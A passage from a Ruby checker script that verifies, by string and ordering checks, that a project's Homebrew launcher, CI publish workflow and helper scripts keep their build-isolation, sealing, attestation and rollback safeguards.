        ), "isolated Brew launcher does not require an explicit sysroot build root")
  [
    "isolated native prefix probe failed with status",
    "isolated native repository probe failed with status",
  ].each do |fragment|
    check(launcher.include?(fragment),
          "isolated Brew launcher lacks #{fragment}")
  end
  check(launcher.scan('"--property=InaccessiblePaths=$sysroot_build_root"').length == 2,
        "isolated target and native Homebrew do not both hide the sysroot build root")
  [
    'HOMEBREW_PATCHED_STAGED_INPUT_SHARED_TEMP=""',
    'HOMEBREW_PATCHED_STAGED_INPUT_DIR=""',
    'HOMEBREW_PATCHED_STAGED_INPUT_PATH=""',
    'homebrew_patched_launcher_remove_staged_input()',
    'protected input cleanup state is incomplete',
    'protected input cleanup path left its shared root',
    'could not remove protected input; preserving cleanup state for retry',
    'homebrew_patched_launcher_stage_protected_input()',
    'expected BUILD_USER SHARED_TEMP SOURCE BASENAME',
    '[ "$build_user" != "$HOMEBREW_PATCHED_BUILD_USER" ]',
    '[ ! -f "$source" ] || [ -L "$source" ]',
    '[ "${#basename}" -gt 512 ]',
    'protected input shared temp must be root-owned mode 1777',
    '"$shared_temp/homebrew-bottle-input.XXXXXX"',
    'a protected input is already registered',
    'HOMEBREW_PATCHED_STAGED_INPUT_SHARED_TEMP="$shared_temp"',
    'HOMEBREW_PATCHED_STAGED_INPUT_DIR="$protected_dir"',
    'HOMEBREW_PATCHED_STAGED_INPUT_PATH="$protected_path"',
    '-o root -g root -m 0444 -- "$source" "$protected_path"',
    '/usr/bin/chown root:root',
    '/usr/bin/chmod 0555',
    '"0:0:555"',
    '"0:0:444:1"',
    '[ "$source" -ef "$protected_path" ]',
    '/usr/bin/cmp -s -- "$source" "$protected_path"',
    '/usr/bin/test -r "$protected_path"',
    '/usr/bin/test -w "$protected_path"',
    '/usr/bin/test -w "$protected_dir"',
    '/usr/bin/rm -rf --',
    'if ! homebrew_patched_launcher_remove_staged_input; then',
    'protected input remains; preserving launcher state for retry',
  ].each do |fragment|
    check(launcher.include?(fragment),
          "protected Formula input staging lacks #{fragment}")
  end
  check(!launcher.include?(
          '/usr/bin/test -r "$xtask_bin" -a -x "$xtask_bin"'
        ),
        "reviewed launcher requires Formula access to the hidden original checker")
  staged_cleanup_owner_index = launcher.index("homebrew_patched_launcher_cleanup()")
  staged_cleanup_teardown_index = launcher.index(
    'homebrew_patched_launcher_teardown "$HOMEBREW_PATCHED_BUILD_USER"',
    staged_cleanup_owner_index
  )
  staged_cleanup_remove_index = launcher.index(
    'if ! homebrew_patched_launcher_remove_staged_input; then',
    staged_cleanup_owner_index
  )
  staged_cleanup_reset_index = launcher.index(
    'HOMEBREW_PATCHED_SUDO_BIN=""', staged_cleanup_owner_index
  )
  check(staged_cleanup_owner_index && staged_cleanup_teardown_index &&
        staged_cleanup_remove_index && staged_cleanup_reset_index &&
        staged_cleanup_teardown_index < staged_cleanup_remove_index &&
        staged_cleanup_remove_index < staged_cleanup_reset_index,
        "protected Formula input is not removed after teardown and before launcher reset")
  check(launcher.scan("HOMEBREW_RELOCATE_BUILD_PREFIX=1").length == 2,
        "isolated Brew launcher does not own both native relocation paths")
  bridge_registration_index = launcher.index(
    'HOMEBREW_PATCHED_NATIVE_BRIDGE_NAMES+=("$formula")'
  )
  bridge_first_mutation_index = launcher.index(
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- /usr/bin/install -d',
    bridge_registration_index
  )
  bridge_rollback_index = launcher.index(
    'native Formula bridge creation failed; rolling back',
    bridge_registration_index
  )
  check(bridge_registration_index && bridge_first_mutation_index && bridge_rollback_index &&
        bridge_registration_index < bridge_first_mutation_index &&
        bridge_first_mutation_index < bridge_rollback_index,
        "native Formula proxies are not registered before their first mutation")
  bridge_cleanup_index = launcher.index("homebrew_patched_launcher_remove_native_bridges()")
  bridge_cleanup_opt_index = launcher.index('/usr/bin/rm -f --',
                                             bridge_cleanup_index)
  bridge_cleanup_rack_index = launcher.index('/usr/bin/rm -rf --',
                                              bridge_cleanup_index)
  check(bridge_cleanup_index && bridge_cleanup_opt_index && bridge_cleanup_rack_index &&
        bridge_cleanup_opt_index < bridge_cleanup_rack_index,
        "native Formula proxy cleanup does not remove opt before its rack")
  check(!launcher.include?('ln -s "$native_rack"') &&
        !launcher.include?('ln -s "$native_opt"'),
        "native Formula proxy uses a rack symlink that Homebrew rejects as a keg")
  cleanup_index = launcher.index("homebrew_patched_launcher_cleanup()")
  teardown_preserve_index = launcher.index(
    "Formula process teardown failed; preserving launcher state for retry",
    cleanup_index
  )
  cleanup_bridge_index = launcher.index(
    "if ! homebrew_patched_launcher_remove_native_bridges; then",
    cleanup_index
  )
  cleanup_state_clear_index = launcher.index(
    'HOMEBREW_PATCHED_SUDO_BIN=""',
    cleanup_index
  )
  check(cleanup_index && teardown_preserve_index && cleanup_bridge_index &&
        cleanup_state_clear_index && teardown_preserve_index < cleanup_bridge_index &&
        cleanup_bridge_index < cleanup_state_clear_index,
        "Formula teardown failure does not preserve launcher state before cleanup")
  seal_function_index = launcher.index("homebrew_patched_launcher_seal_overlay()")
  seal_state_index = launcher.index(
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="sealing"', seal_function_index
  )
  seal_mode_index = launcher.index(
    '-exec /usr/bin/chmod 0555 {} +', seal_state_index
  )
  sealed_state_index = launcher.index(
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="sealed"', seal_mode_index
  )
  isolate_index = launcher.index("homebrew_patched_launcher_isolate()")
  isolate_seal_index = launcher.index(
    'homebrew_patched_launcher_seal_overlay "$build_user"', isolate_index
  )
  isolate_integrity_index = launcher.index(
    'HOMEBREW_PATCHED_INTEGRITY_SHA256=', isolate_seal_index
  )
  check(seal_function_index && seal_state_index && seal_mode_index &&
        sealed_state_index && isolate_seal_index && isolate_integrity_index &&
        seal_state_index < seal_mode_index && seal_mode_index < sealed_state_index &&
        isolate_seal_index < isolate_integrity_index,
        "Homebrew overlay sealing is not registered before mode changes and integrity capture")
  isolate_attestation_index = launcher.index(
    "homebrew_patched_launcher_stage_native_overlay_attestation",
    isolate_integrity_index
  )
  isolate_runtime_activation_index = launcher.index(
    'HOMEBREW_PATCHED_SYSTEMD_RUN_BIN="$systemd_run_bin"',
    isolate_attestation_index
  )
  run_native_index = launcher.index("homebrew_patched_launcher_run_native()")
  run_native_attestation_index = launcher.index(
    "homebrew_patched_launcher_verify_native_overlay_attestation || return",
    run_native_index
  )
  run_native_dispatch_index = launcher.index(
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- "$HOMEBREW_PATCHED_NATIVE_RUNNER"',
    run_native_attestation_index
  )
  isolation_verifier_index = launcher.index(
    "homebrew_patched_launcher_verify_isolation()"
  )
  isolation_attestation_index = launcher.index(
    "homebrew_patched_launcher_verify_native_overlay_attestation || return",
    isolation_verifier_index
  )
  isolation_integrity_index = launcher.index(
    'homebrew_patched_launcher_integrity)" = "$HOMEBREW_PATCHED_INTEGRITY_SHA256"',
    isolation_attestation_index
  )
  cleanup_attestation_index = launcher.index(
    "if ! homebrew_patched_launcher_verify_native_overlay_attestation; then",
    cleanup_index
  )
  cleanup_protected_remove_index = launcher.index(
    '"$HOMEBREW_PATCHED_PROTECTED_DIR"',
    cleanup_attestation_index
  )
  check(isolate_attestation_index && isolate_runtime_activation_index &&
        run_native_attestation_index && run_native_dispatch_index &&
        isolation_attestation_index && isolation_integrity_index &&
        cleanup_attestation_index && cleanup_protected_remove_index &&
        isolate_integrity_index < isolate_attestation_index &&
        isolate_attestation_index < isolate_runtime_activation_index &&
        run_native_attestation_index < run_native_dispatch_index &&
        isolation_attestation_index < isolation_integrity_index &&
        teardown_preserve_index < cleanup_attestation_index &&
        cleanup_attestation_index < cleanup_protected_remove_index,
        "sealed native overlay identity is not staged and rechecked across its lifecycle")
  cleanup_restore_index = launcher.index(
    "homebrew_patched_launcher_restore_overlay_for_cleanup", cleanup_index
  )
  cleanup_worktree_remove_index = launcher.index(
    "worktree remove --force", cleanup_restore_index
  )
  cleanup_overlay_state_clear_index = launcher.index(
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE=""', cleanup_worktree_remove_index
  )
  check(cleanup_restore_index && cleanup_worktree_remove_index &&
        cleanup_overlay_state_clear_index &&
        teardown_preserve_index < cleanup_restore_index &&
        cleanup_restore_index < cleanup_worktree_remove_index &&
        cleanup_worktree_remove_index < cleanup_overlay_state_clear_index,
        "Homebrew overlay cleanup does not restore only after teardown and clear after removal")
  check(!launcher.include?('chmod 0660 "$trust_lock"') &&
        !launcher.include?('chown "root:$build_group" "$trust_lock"'),
        "isolated Brew launcher leaves the trust lock writable")
  target_environment = launcher[/\n  preserved_variables=\((.*?)\n  \)/m, 1]
  check(target_environment&.include?("HOMEBREW_KANDELO_GNU_TAR"),
        "isolated target Homebrew drops the validated GNU tar path")
  check(target_environment &&
        !target_environment.match?(
          /(?:HOMEBREW_KANDELO_XTASK_BIN|WASM_POSIX_XTASK_BIN)/
        ),
        "isolated target Homebrew preserves a caller-selected checker path")
  native_environment = launcher[/native_preserved_variables=\((.*?)\n  \)/m, 1]
  check(native_environment &&
        !native_environment.match?(
          /KANDELO|HOMEBREW_CACHE|HOMEBREW_TEMP|XDG_CONFIG_HOME|LLVM|GNU_TAR|XTASK/
        ),
        "isolated native Homebrew inherits target-only state or Kandelo controls")
  gnu_tar_executable_index = launcher.index(
    '"$HOMEBREW_KANDELO_GNU_TAR" "Nix GNU tar" || return'
  )
  gnu_tar_tree_index = launcher.index(
    '"$build_user" "$HOMEBREW_KANDELO_GNU_TAR" || return',
    gnu_tar_executable_index
  )
  check(gnu_tar_executable_index && gnu_tar_tree_index &&
        gnu_tar_executable_index < gnu_tar_tree_index,
        "GNU tar ancestor replacement protection does not follow executable validation")
  launcher_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-patched-launcher.sh")
  )
  check(launcher_test.include?(
          "isolated native identity probes do not label and preserve failures"
        ), "launcher tests omit native identity probe status preservation")
  hidden_backing_git_fixture = launcher_test[
    /  assert-hidden-backing-git\)\n(.*?)\n    ;;/m,
    1
  ]
  check(hidden_backing_git_fixture &&
        !launcher_test.include?("assert-cross-owner-git") &&
        launcher_test.include?(
          "homebrew_patched_launcher_run_native assert-hidden-backing-git"
        ), "launcher regression still expects exact safe.directory to expose hidden Git metadata")
  [
    'GIT_CONFIG_VALUE_0="${repository%/*}"',
    'GIT_CONFIG_VALUE_0="$repository"',
    "rev-parse --verify 'HEAD^{commit}'",
  ].each do |fragment|
    check(hidden_backing_git_fixture.include?(fragment),
          "hidden backing-Git regression lacks #{fragment}")
  end
  check(hidden_backing_git_fixture.scan("if /usr/bin/env -i").length == 3 &&
        hidden_backing_git_fixture.scan(
          "rev-parse --verify 'HEAD^{commit}'"
        ).length == 3 &&
        !hidden_backing_git_fixture.include?("actual_commit="),
        "hidden backing-Git regression does not reject bare, parent-safe, and exact-safe Git")
  [
    "a missing program-index checker",
    "a symlinked program-index checker",
    "a program-index checker outside Kandelo",
    "a non-release program-index checker",
    "an inaccessible program-index checker",
    "a build-user-writable program-index checker",
    "a hard-linked program-index checker",
    "a Formula-user-owned program-index checker",
    "a build-user-replaceable program-index checker",
    "program-index checker fixture does not model a workflow-private checkout",
    "isolated launcher did not stage one exact root-owned checker inode",
    "isolated launcher accepted changed program-index checker bytes",
    "isolated launcher accepted changed root-owned checker bytes",
    "isolation verification accepted changed root-owned checker bytes",
    "isolated launcher accepted a replaced root-owned checker inode",
    "isolation verification accepted a replaced root-owned checker inode",
    "isolated cleanup left the protected checker or source aliases",
    %q([ "$(/usr/bin/stat -c '%u:%g:%a:%h' "$5")" = "0:0:555:1" ]),
    "HOMEBREW_KANDELO_XTASK_BIN=caller-poison",
    "WASM_POSIX_XTASK_BIN=caller-poison",
    "build-deps program-index-context-check",
    "Tier-2 schema reader did not identify a registry bridge",
    "Tier-2 schema reader did not identify a tap recipe",
    "Tier-2 schema reader accepted a multiline control document",
    "Tier-2 schema reader accepted a retired control schema",
    '--source-repo-root "$2"',
    "assert_real_relocated_xtask_uses_source_alias",
    '"--property=BindReadOnlyPaths=$REPO_ROOT:$source_alias"',
    '"--property=InaccessiblePaths=$REPO_ROOT"',
    '--source-repo-root "$source_alias"',
    "A relocated checker without explicit authority must stop before it can",
    '"the xtask compile checkout $original_root is not accessible ("',
    '"pass the intended canonical checkout with --source-repo-root"',
    'protected_selector_root="$ISOLATION_ROOT/protected-version-selector"',
    'escaped_selector_target_root="$ISOLATION_ROOT/escaped-version-target"',
    'replaceable_selector_root="$ISOLATION_ROOT/replaceable-version-selector"',
    "protected root-owned version selector was rejected",
    "distribution-provided protected Python selector was rejected",
    "version selector escaped its protected system directory",
    "version selector accepted a build-user-replaceable tool",
    "sealed platform projection did not admit the exact recipe runner",
    "recipe runner admission accepted the mutable checkout projection source",
    "recipe runner admission accepted a non-root-owned source",
    "recipe runner admission accepted changed source bytes",
    "recipe runner admission accepted a symlinked source substitution",
    "recipe runner admission accepted an unavailable projected source",
    "recipe runner fixture does not model a workflow-private checkout",
    "isolated launcher did not stage the admitted root-owned recipe runner",
    "isolated launcher did not protect the canonical target Brew path",
    "build identity can replace the canonical target Brew launcher",
    "isolated launcher did not protect mutable Homebrew configuration",
    "isolated launcher left normal Homebrew configuration read-only",
    "build identity can replace protected Homebrew configuration",
    "dependency sealing disabled the target Formula insertion roots",
    "workflow user retaining accidental write access to Formula-owned state",
    "protected source audit ignored a missing required namespace path",
    "protected source audit hid its systemd namespace diagnostic",
    "isolated launcher did not stage the closed Formula test runtime",
    "native API admission accepted a symlinked cache entry",
    "native API source could be selected more than once",
    "Formula isolation accepted a changed native API source",
    "isolated launcher did not create the protected native contract root",
    "native contract staging accepted a symlinked source",
    "native contract staging replaced an occupied destination",
    "sealed native API prevented ordinary bottle-cache writes",
    "launcher cleanup changed the workflow-owned native API source",
    "this is the exact failure boundary from the seven-package canary",
    "NODE_PATH=caller-poison",
    "--import tsx/esm",
    "isolation verification accepted mutable Formula test runtime bytes",
  ].each do |fragment|
    check(launcher_test.include?(fragment),
          "launcher checker regression lacks #{fragment}")
  end
  check(launcher_test.include?("assert-protected-gnu-tar") &&
        launcher_test.include?('[ ! -w "$2" ] && [ ! -w "${2%/*}" ]'),
        "launcher regression does not exercise GNU tar as the dedicated Formula identity")
  check(launcher_test.include?(
          "isolation fixture unexpectedly put repository-owned taps under the prefix"
        ) && launcher_test.include?(
          "assert_primary_tap_rejected"
        ) && launcher_test.include?(
          "a prefix-owned primary tap lookalike"
        ) && launcher_test.include?(
          "a primary tap outside the active repository tap store"
        ) && launcher_test.include?(
          "a symlinked primary tap"
        ), "launcher regression does not exercise the active repository tap boundary")
  native_validation_index = launcher.index('native_inputs=("$native_prefix"')
  native_overlap_index = launcher.index(
    "Homebrew state roots must not contain one another"
  )
  native_create_index = launcher.index('for path in "${native_roots[@]}"; do')
  check(native_validation_index && native_overlap_index && native_create_index &&
        native_validation_index < native_overlap_index &&
        native_overlap_index < native_create_index,
        "native Homebrew mutates roots before validating realm separation")
  [
    "remaining_bridges=()",
    'remaining_bridges+=("$formula")',
    'HOMEBREW_PATCHED_NATIVE_BRIDGE_NAMES=("${remaining_bridges[@]}")',
    "if ! homebrew_patched_launcher_remove_native_bridges; then",
    "native Formula bridges remain; preserving launcher state for retry",
  ].each do |fragment|
    check(launcher.include?(fragment),
          "native bridge cleanup retry contract lacks #{fragment}")
  end
  checker_derivation_index = bottle_builder.index(
    'XTASK_BIN="$KANDELO_ROOT/target/$HOST_TARGET/release/xtask"'
  )
  checker_match_index = bottle_builder.index(
    '[ "${WASM_POSIX_XTASK_BIN:-}" != "$XTASK_BIN" ]',
    checker_derivation_index || 0
  )
  checker_export_index = bottle_builder.index(
    "export WASM_POSIX_XTASK_BIN", checker_match_index || 0
  )
  checker_isolate_index = bottle_builder.index(
    'homebrew_patched_launcher_isolate "$BUILD_USER"',
    checker_export_index || 0
  )
  check(checker_derivation_index && checker_match_index &&
        checker_export_index && checker_isolate_index &&
        checker_derivation_index < checker_match_index &&
        checker_match_index < checker_export_index &&
        checker_export_index < checker_isolate_index &&
        bottle_builder.include?(
          "scoped program-index checker differs from the exact host xtask"
        ),
        "reviewed bottle builder does not bind the scoped checker to its host target")
  publisher_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-publish-workflow.sh")
  )
  check(publisher_test.include?(
          "another safe target-triple checker"
        ) && publisher_test.include?(
          "mismatched checker authority"
        ) && publisher_test.include?(
          "isolated bottle verifier accepted another safe target-triple checker"
        ) && publisher_test.include?(
          "isolated bottle verifier did not explain the mismatched checker authority"
        ),
        "publisher regressions do not reject a second safe checker identity")
  teardown_index = bottle_builder.index('homebrew_patched_launcher_teardown "$BUILD_USER"')
  artifact_index = bottle_builder.index("mapfile -t bottle_jsons")
  check(teardown_index && artifact_index && teardown_index < artifact_index,
        "reviewed bottle builder reads artifacts before Formula process teardown")
  runtime_step = named_step(build_steps, "Materialize Formula test platform runtime")
  check(runtime_step.keys.sort == %w[id name run shell] &&
        runtime_step["id"] == "formula-runtime" &&
        runtime_step["shell"] == "bash",
        "publisher Formula test runtime mapping changed")
  runtime_run = runtime_step.fetch("run")
  [
    "bash scripts/dev-shell.sh bash -c", 'host="$(rustc -vV | sed -n "s/^host: //p")"',
    'cargo build --release -p xtask --target "$host" --quiet',
    'xtask="$PWD/target/$host/release/xtask"',
    '[ -f "$xtask" ] && [ ! -L "$xtask" ] && [ -x "$xtask" ]',
    '[ "$(realpath -- "$xtask")" = "$xtask" ]',
    'bash scripts/seal-homebrew-formula-checker.sh',
    '--root "$PWD"', '--checker "$xtask"',
    '[ "$sealed_xtask" = "$xtask" ]',
    'printf "xtask-bin=%s\\n" "$xtask" >>"$GITHUB_OUTPUT"',
    'formula_test_packages="dash,coreutils,grep,sed,rootfs"',
    'for package in ${formula_test_packages//,/ }; do', '"$xtask"',
    "build-deps --arch wasm32", '--binaries-dir "$PWD/binaries"', '--fetch-only resolve "$package"',
    'cache_root="$("$xtask" build-deps cache-root)"',
    'case "$cache_root" in',
    'bash scripts/materialize-resolver-binaries.sh',
    '"$PWD/binaries" "$cache_root"',
    'formula-test-program-packages.json',
    'build-deps program-index-selected',
    '--source-repo-root "$PWD"',
  ].each do |fragment|
    check(runtime_run.include?(fragment), "publisher Formula test runtime lacks #{fragment}")
  end
  check(!runtime_run.include?("cargo run") && !runtime_run.include?("GITHUB_ENV"),
        "publisher Formula test checker is rebuilt or leaked job-wide")
  dev_shell = File.read(File.join(REPO_ROOT, "scripts/dev-shell.sh"))
  check(!dev_shell.include?("WASM_POSIX_XTASK_BIN"),
        "dev shell makes the Formula checker a global package-toolchain input")
  check(publisher_test.include?(
          "assert_formula_test_program_projection_is_current_and_bounded"
        ) && publisher_test.include?(
          "Formula checker could not generate its selected source projection"
        ) && publisher_test.include?(
          'committed="$REPO_ROOT/packages/registry/program-packages.json"'
        ) && publisher_test.include?(
          'committed.fetch("packages").fetch(name) == row'
        ) && publisher_test.include?(
          'committed.fetch("identities").fetch(name) == row'
        ) && publisher_test.include?(
          "Formula checker projection is not the current selected package closure"
        ),
        "publisher regression does not protect the current selected Formula-test closure")
  check(!publisher_test.include?(
          "assert_exact_source_program_projection_is_fresh"
        ) && !publisher_test.include?(
          "build-deps program-index-context-check"
        ),
        "publisher regression still couples Homebrew to the global package projection")
  checker_sealer = File.read(
    File.join(REPO_ROOT, "scripts/seal-homebrew-formula-checker.sh")
  )
  [
    'set -euo pipefail',
    '[ "$(realpath -- "$ROOT" 2>/dev/null || true)" != "$ROOT" ]',
    '[ "$(realpath -- "$CHECKER" 2>/dev/null || true)" != "$CHECKER" ]',
    '"$ROOT"/target/*/release/xtask',
    '[ $((8#$source_mode & 06022)) -ne 0 ]',
    'sealed="$CHECKER.formula-seal"',
    '[ -e "$sealed" ] || [ -L "$sealed" ]',
    "Cargo hard-links target/<host>/release/xtask",
    'install -m 0555 -- "$CHECKER" "$sealed"',
    '[ "$sealed_mode" != "555" ] || [ "$sealed_links" != "1" ]',
    '[ "$sealed_sha256" != "$source_sha256" ]',
    'mv -f -- "$sealed" "$CHECKER"',
    '[ "$final_mode" != "555" ] || [ "$final_links" != "1" ]',
    '[ "$final_sha256" != "$source_sha256" ]',
  ].each do |fragment|
    check(checker_sealer.include?(fragment),
          "Formula checker sealer lacks #{fragment}")
  end
  checker_sealer_test = File.read(
    File.join(REPO_ROOT, "scripts/test-seal-homebrew-formula-checker.sh")
  )
  check(
    publisher_test.include?(
      'bash "$REPO_ROOT/scripts/test-seal-homebrew-formula-checker.sh"'
    ) &&
      checker_sealer_test.include?("fixture does not model Cargo's Linux hardlink") &&
      checker_sealer_test.include?("sealed checker still aliases Cargo's deps artifact") &&
      checker_sealer_test.include?("Cargo's alternate path can mutate the sealed checker") &&
      checker_sealer_test.include?("sealer accepted a writable source checker") &&
      checker_sealer_test.include?("sealer overwrote an occupied seal destination"),
    "publisher regressions do not prove Cargo hardlink detachment"
  )
  materializer = File.read(File.join(REPO_ROOT, "scripts/materialize-resolver-binaries.sh"))
  [
    'PORTABLE_CACHE_REL=".ci-test-binary-cache"',
    'bash "$script_root/stage-portable-resolver-binaries.sh"',
    '"$source_dir" "$cache_root" "$stage_root"',
    'Formula runtime contains no portable program cache',
    'mv "$staged_cache" "$portable_cache"',
    'original_move_started=1',
    'mv "$source_dir" "$backup"',
    'mv "$staged_binaries" "$source_dir"',
    'find "$source_dir" "$portable_cache" -xdev -type d -exec chmod 0555 {} +',
    'find "$source_dir" "$portable_cache" -xdev -type f -exec chmod 0444 {} +',
    'rm -rf -- "$portable_cache"',
    "rolling back after that point could restore an incomplete original tree",
    'original_move_started=0',
    'could not remove the original resolver tree; preserving $transaction',
    "trap - EXIT",
    'rollback failed; preserving $transaction',
  ].each do |fragment|
    check(materializer.include?(fragment),
          "publisher Formula runtime materialization lacks #{fragment}")
  end
  commit_marker = materializer.index(
    "rolling back after that point could restore an incomplete original tree"
  )
  backup_delete = materializer.index('rm -rf -- "$backup"')
  check(
    !commit_marker.nil? && !backup_delete.nil? && commit_marker < backup_delete &&
      materializer[commit_marker...backup_delete].include?("original_move_started=0") &&
      materializer[backup_delete..].include?("trap - EXIT"),
    "publisher Formula runtime may restore a partially deleted original tree"
  )
  portable_stager = File.read(
    File.join(REPO_ROOT, "scripts/stage-portable-resolver-binaries.sh")
  )
  [
    'PORTABLE_CACHE_REL=".ci-test-binary-cache"',
    'fetched program mirrors must remain generation symlinks',
    'program resolver link targets a noncanonical cache',
    'cp -a -- "$source_generation" "$staged_cache/programs/$generation"',
    '"$(relative_cache_link "$mirror_relative" "$cache_relative")"',
    'portable resolver closure contains an absolute, dangling, or escaping link',
    'staged bytes differ from resolver output',
  ].each do |fragment|
    check(portable_stager.include?(fragment),
          "portable resolver generation staging lacks #{fragment}")
  end
  workspace_packer = File.read(
    File.join(REPO_ROOT, "scripts/pack-ci-test-workspace.sh")
  )
  check(
    workspace_packer.include?(
      'bash scripts/stage-portable-resolver-binaries.sh'
    ) &&
      workspace_packer.include?(
        '"$REPO_ROOT/binaries" "$source_cache_root" "$stage"'
      ),
    "prepared CI workspace and Formula runtime do not share generation staging"
  )
  check_architecture_aware_sysroot_step(
    named_step(build_steps, "Build Kandelo sysroot"), "publisher build"
  )
  verifier_sysroot_step = named_step(
    verify_steps, "Build Kandelo sysroot for sidecar evidence"
  )
  check_architecture_aware_sysroot_step(verifier_sysroot_step, "publisher verifier")
  verifier_sysroot_run = verifier_sysroot_step.fetch("run")
  [
    'expected_sha="$(git -C kandelo rev-parse HEAD)"',
    'git -C kandelo-sysroot-build rev-parse HEAD',
    'git -C kandelo-sysroot-build status --short',
    "cd kandelo-sysroot-build",
  ].each do |fragment|
    check(verifier_sysroot_run.include?(fragment),
          "publisher verifier sysroot isolation lacks #{fragment}")
  end
  check(!verifier_sysroot_run.lines.any? { |line| line.strip == "cd kandelo" },
        "publisher verifier builds its mutable sysroot in the reviewed source checkout")
  verifier_kernel_step = named_step(verify_steps, "Build exact Kandelo kernel")
  verifier_kernel_run = verifier_kernel_step.fetch("run")
  check(verifier_kernel_step.keys.sort == %w[name run shell] &&
        verifier_kernel_step["shell"] == "bash" &&
        verifier_kernel_run.include?("cd kandelo") &&
        verifier_kernel_run.include?("bash scripts/dev-shell.sh env") &&
        verifier_kernel_run.include?(
          'WASM_POSIX_LOCAL_INSTALL_SESSION=homebrew-verifier-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}'
        ) &&
        verifier_kernel_run.include?(
          "bash packages/registry/kernel/build-kernel.sh"
        ), "publisher does not build the verifier kernel into its exact local generation")
  kernel_step = named_step(build_steps, "Build Kandelo kernel")
  fork_instrument_step = named_step(build_steps, "Build fork-instrument host tool")
  check(fork_instrument_step.keys.sort == %w[name run shell] &&
        fork_instrument_step["shell"] == "bash" &&
        fork_instrument_step.fetch("run").include?("cd kandelo") &&
        fork_instrument_step.fetch("run").include?(
          "bash scripts/dev-shell.sh bash scripts/build-fork-instrument-tool.sh"
        ), "publisher does not build the reviewed fork-instrument host tool")
  javascript_step = named_step(build_steps, "Install JavaScript dependencies for formula tests")
  browser_fragments = [
    'cd "$GITHUB_WORKSPACE/kandelo"', "bash scripts/dev-shell.sh env",
    'KANDELO_HOMEBREW_SHARED_TEMP="$KANDELO_HOMEBREW_SHARED_TEMP"',
    'KANDELO_HOMEBREW_BUILD_USER="$KANDELO_HOMEBREW_BUILD_USER"',
    'KANDELO_HOMEBREW_SUDO_BIN="$KANDELO_HOMEBREW_SUDO_BIN"',
    'node_bin="$(command -v node)"', "/nix/store/*/bin/node",
    "Formula browser provisioning resolved an undeclared Node",
    "bash scripts/homebrew-provision-formula-browser.sh",
    '--shared-temp "$KANDELO_HOMEBREW_SHARED_TEMP"',
    '--build-user "$KANDELO_HOMEBREW_BUILD_USER"',
    '--sudo-bin "$KANDELO_HOMEBREW_SUDO_BIN"', '--node-bin "$node_bin"',
    '--browser-app "$PWD/apps/browser-demos"',
  ]
  check_browser_step = lambda do |steps, name, label|
    step = named_step(steps, name)
    check(step.keys.sort == %w[name run shell] && step["shell"] == "bash",
          "#{label} Formula browser runtime mapping changed")
    run = step.fetch("run")
    browser_fragments.each do |fragment|
      check(run.include?(fragment), "#{label} Formula browser runtime lacks #{fragment}")
    end
    dev_shell_index = run.index("bash scripts/dev-shell.sh env")
    node_resolution_index = run.index('node_bin="$(command -v node)"')
    check(dev_shell_index && node_resolution_index && dev_shell_index < node_resolution_index,
          "#{label} resolves Formula browser Node from the hosted runner PATH")
    step
  end
  browser_step = check_browser_step.call(
    build_steps, "Provision Formula browser runtime", "publisher build"
  )
  verify_browser_step = check_browser_step.call(
    verify_steps, "Provision Formula browser runtime for bottle verification",
    "publisher verifier"
  )
  browser_provisioner = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-provision-formula-browser.sh")
  )
  [
    'BROWSER_CACHE="$SHARED_TEMP/ms-playwright"',
    '[ -e "$BROWSER_CACHE" ] || [ -L "$BROWSER_CACHE" ]',
    'PLAYWRIGHT_BROWSERS_PATH="$BROWSER_CACHE"',
    'HOST_SYSTEM_PATH="$(dirname "$SUDO_BIN"):/usr/sbin:/usr/bin:/sbin:/bin"',
    'PATH="$PATH:$HOST_SYSTEM_PATH" PLAYWRIGHT_BROWSERS_PATH="$BROWSER_CACHE"',
    '"$NODE_BIN" "$PLAYWRIGHT_CLI" install chromium --with-deps',
    'requireFromBrowserApp("@playwright/test")',
    'KANDELO_ROOT_PACKAGE="$KANDELO_ROOT/package.json"',
    'const requireFromRuntime = createRequire(process.argv[2]);',
    'const { chromium } = requireFromRuntime("playwright");',
    '[ "$RUNTIME_BROWSER_EXECUTABLE" != "$BROWSER_EXECUTABLE" ]',
    'Formula runtime Playwright resolved a different Chromium',
    '"$SUDO_BIN" -n -- chown -R root:root "$BROWSER_CACHE"',
    '"$SUDO_BIN" -n -- chmod -R a-w "$BROWSER_CACHE"',
    '"$SUDO_BIN" -n -H -u "$BUILD_USER" --',
    'test -w "$BROWSER_CACHE" -o -w "$BROWSER_EXECUTABLE"',
    "Playwright Chromium escaped its cache",
  ].each do |fragment|
    check(browser_provisioner.include?(fragment),
          "reviewed Formula browser provisioner lacks #{fragment}")
  end
  verifier_identity_step = named_step(
    verify_steps, "Create isolated bottle verification identity"
  )
  verifier_identity_run = verifier_identity_step.fetch("run")
  [
    'userdel_bin="/usr/sbin/userdel"',
    '"$sudo_bin" -n -- "$useradd_bin" --system --user-group --no-create-home',
    '"$sudo_bin" -n -- "$userdel_bin" -r "$build_user"',
    "could not roll back partial verifier identity creation",
    'shared_temp=""',
    "rollback_identity_setup() {",
    "trap rollback_identity_setup EXIT",
    '[[ "$shared_temp" == /tmp/kandelo-homebrew-verify.?????? ]]',
    '"$sudo_bin" -n -- /usr/bin/rm -rf -- "$shared_temp"',
    "could not roll back partial verifier temporary root",
    "could not roll back partial verifier recipe identity",
    "could not roll back partial verifier build identity",
    'echo "created=true" >> "$GITHUB_OUTPUT"',
    "trap - EXIT",
  ].each do |fragment|
    check(verifier_identity_run.include?(fragment),
          "publisher verifier identity transaction lacks #{fragment}")
  end
  verifier_rollback_index = verifier_identity_run.index(
    "trap rollback_identity_setup EXIT"
  )
  verifier_temp_index = verifier_identity_run.index(
    'shared_temp="$(mktemp -d /tmp/kandelo-homebrew-verify.XXXXXX)"'
  )
  verifier_env_index = verifier_identity_run.index('} >> "$GITHUB_ENV"')
  verifier_created_index = verifier_identity_run.index(
    'echo "created=true" >> "$GITHUB_OUTPUT"'
  )
  verifier_commit_index = verifier_identity_run.rindex("trap - EXIT")
  check(verifier_identity_run.index(recipe_identity_create) <
          verifier_rollback_index &&
        verifier_rollback_index < verifier_temp_index &&
